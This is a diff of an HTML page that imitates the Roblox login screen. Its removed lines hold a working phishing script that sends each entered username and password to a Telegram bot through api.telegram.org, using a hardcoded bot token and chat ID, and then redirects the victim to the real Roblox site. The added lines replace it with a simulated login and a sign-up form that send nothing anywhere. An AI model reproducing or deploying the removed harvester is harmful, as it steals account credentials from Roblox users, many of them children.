@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Roblox</title>
+    <title>Roblox Login & Sign Up</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #1E1E2F; /* Darker background for a more professional look */
+            background-color: #1E1E2F; /* Dark background */
             color: #ffffff;
             display: flex;
             justify-content: center;
@@ -15,18 +15,18 @@
             height: 100vh;
             margin: 0;
         }
-        .login-container {
-            background-color: #2A2A3A; /* Slightly lighter gray for container */
+        .container {
+            background-color: #2A2A3A; /* Container background */
             padding: 30px;
             border-radius: 10px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
             text-align: center;
-            width: 400px; /* Increased width for a more spacious layout */
+            width: 400px; /* Container width */
         }
         h1 {
             margin-bottom: 25px;
-            font-size: 28px; /* Increased font size for the title */
-            color: #FFCC00; /* Bright yellow for the title */
+            font-size: 28px; /* Title font size */
+            color: #FFCC00; /* Title color */
         }
         input {
             display: block;
@@ -35,101 +35,114 @@
             margin: 10px 0;
             border: 1px solid #4f4f4f;
             border-radius: 5px;
-            background-color: #3C3F47; /* Darker gray for input fields */
+            background-color: #3C3F47; /* Input field background */
             color: #ffffff;
-            font-size: 16px; /* Increased font size for inputs */
+            font-size: 16px; /* Input font size */
         }
         button {
-            background-color: #FFCC00; /* Bright yellow for button */
+            background-color: #FFCC00; /* Button color */
             color: black;
             padding: 15px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px; /* Increased font size for button */
+            font-size: 16px; /* Button font size */
             width: 100%;
-            transition: background-color 0.3s; /* Smooth transition for hover effect */
+            transition: background-color 0.3s; /* Button hover effect */
         }
         button:hover {
             background-color: #e6b800; /* Darker yellow on hover */
         }
-        .forgot-password,
         .footer {
-            margin-top: 25px;
-            font-size: 14px; /* Increased font size for links */
+            margin-top: 20px;
+            font-size: 14px; /* Footer font size */
             color: #cccccc;
         }
-        .forgot-password a,
         .footer a {
-            color: #FFCC00;
+            color: #FFCC00; /* Footer link color */
             text-decoration: none;
         }
-        .forgot-password a:hover,
         .footer a:hover {
-            text-decoration: underline;
+            text-decoration: underline; /* Footer link hover effect */
         }
         #result {
             margin-top: 20px;
-            color: #FFCC00; /* Yellow for result text */
+            color: #FFCC00; /* Result text color */
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Login to Roblox</h1>
+    <div class="container">
+        <h1>Welcome to Roblox</h1>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <input type="text" id="username" placeholder="Username/Email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
-        <p id="result"></p>
-        <div class="forgot-password">
-            <p><a href="#">Forgot Password or Username?</a></p>
-        </div>
         <div class="footer">
-            <p>Don't have an account? <a href="#">Sign Up</a></p>
+            <p>Don't have an account? <a href="#" id="showSignUp">Sign Up</a></p>
         </div>
+        <p id="result"></p>
+    </div>
+
+    <div class="container" id="signUpContainer" style="display: none;">
+        <h1>Sign Up</h1>
+        <form id="signUpForm">
+            <input type="text" id="newUsername" placeholder="Username" required>
+            <input type="email" id="newEmail" placeholder="Email" required>
+            <input type="password" id="newPassword" placeholder="Password" required>
+            <button type="submit">Sign Up</button>
+        </form>
+        <div class="footer">
+            <p>Already have an account? <a href="#" id="showLogin">Log In</a></p>
+        </div>
+        <p id="signUpResult"></p>
     </div>
 
     <script>
-        // Your actual Telegram Bot Token and Chat ID
-        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // Your bot token
-        const CHAT_ID = '7072093078'; // Your chat ID
-
-        // Handle form submission
+        // Handle login form submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
             var result = document.getElementById('result');
-            
-            var message = `🟢 New Login Data:\n\n👤 Username: ${username}\n🔑 Password: ${password}`;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                result.textContent = "Data sent! Thank you for logging in.";
-                result.style.color = "#4CAF50"; // Green color for success messages
-                
-                // Redirect to Roblox after 1 second
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com";
-                }, 1000); // 1 second delay
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                result.textContent = "An error occurred while sending data. Please try again.";
-            });
+
+            // Simulate login process
+            result.textContent = "Logging in..."; // Simulated response
+            setTimeout(() => {
+                result.textContent = "Welcome back, " + username + "!";
+                // Redirect to lobby or main page
+                window.location.href = "https://www.roblox.com"; // Redirect to Roblox
+            }, 1000); // Simulated delay
+        });
+
+        // Handle sign up form submission
+        document.getElementById('signUpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var newUsername = document.getElementById('newUsername').value;
+            var newEmail = document.getElementById('newEmail').value;
+            var newPassword = document.getElementById('newPassword').value;
+            var signUpResult = document.getElementById('signUpResult');
+
+            // Simulate sign up process
+            signUpResult.textContent = "Signing up..."; // Simulated response
+            setTimeout(() => {
+                signUpResult.textContent = "Account created for " + newUsername + "!";
+                // Redirect to lobby or main page
+                window.location.href = "https://www.roblox.com"; // Redirect to Roblox
+            }, 1000); // Simulated delay
+        });
+
+        // Show sign up form
+        document.getElementById('showSignUp').addEventListener('click', function() {
+            document.getElementById('loginForm').parentElement.style.display = 'none';
+            document.getElementById('signUpContainer').style.display = 'block';
+        });
+
+        // Show login form
+        document.getElementById('showLogin').addEventListener('click', function() {
+            document.getElementById('signUpContainer').style.display = 'none';
+            document.getElementById('loginForm').parentElement.style.display = 'block';
         });
     </script>
 </body>
